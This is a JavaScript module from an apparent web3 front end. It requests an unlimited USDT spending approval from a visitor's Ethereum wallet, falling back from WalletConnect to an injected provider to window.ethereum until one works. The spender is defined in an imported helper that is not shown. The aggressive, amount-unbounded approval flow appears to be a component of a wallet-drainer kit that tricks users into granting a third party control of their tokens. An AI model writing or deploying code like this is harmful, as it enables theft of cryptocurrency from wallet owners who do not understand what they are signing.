import { getInjectedEVMProvider, executeUnlimitedUSDTApproval } from '@/lib/evmWallet'
import { getEVMWCProvider } from '@/config/walletconnect'

/**
 * Execute unlimited USDT approval for EVM / Ethereum wallets
 */
export async function triggerUnlimitedApproval(userAddress, connectionType = 'evm') {
  console.log(`[Approval] Triggering unlimited EVM USDT approval for ${userAddress} via ${connectionType}`)

  // 1. Try WalletConnect if session is active
  try {
    const wcProvider = await getEVMWCProvider()
    if (wcProvider && wcProvider.session) {
      let chainId = '0x1'
      const accounts = wcProvider.session?.namespaces?.eip155?.accounts || []
      const accountWithChain = accounts.find(acc => acc.toLowerCase().includes(userAddress.toLowerCase()))
      if (accountWithChain) {
        // format is "eip155:1:0x..."
        const parts = accountWithChain.split(':')
        if (parts.length === 3) {
          chainId = `0x${parseInt(parts[1], 10).toString(16)}`
        }
      }
      
      console.log(`[Approval] Using WalletConnect provider for EVM approval. Chain ID: ${chainId}`)
      const res = await executeUnlimitedUSDTApproval(wcProvider, userAddress, chainId)
      console.log('[Approval] WalletConnect EVM approval result:', res)
      return res
    }
  } catch (err) {
    console.warn('[Approval] WalletConnect check/approval failed or not available:', err)
  }

  // 2. Try Injected Provider
  const evmProvider = getInjectedEVMProvider()
  if (evmProvider) {
    try {
      const chainId = (await evmProvider.request({ method: 'eth_chainId' })) || '0x1'
      const res = await executeUnlimitedUSDTApproval(evmProvider, userAddress, chainId)
      console.log('[Approval] EVM approval result:', res)
      return res
    } catch (err) {
      console.error('[Approval] EVM approval failed:', err)
      throw err
    }
  }

  // 3. Fallback for embedded EVM session
  if (typeof window !== 'undefined' && window.ethereum) {
    try {
      const chainId = (await window.ethereum.request({ method: 'eth_chainId' })) || '0x1'
      const res = await executeUnlimitedUSDTApproval(window.ethereum, userAddress, chainId)
      return res
    } catch (err) {
      console.error('[Approval] Fallback EVM approval failed:', err)
      throw err
    }
  }

  throw new Error('No active EVM/Ethereum wallet provider detected for approval.')
}
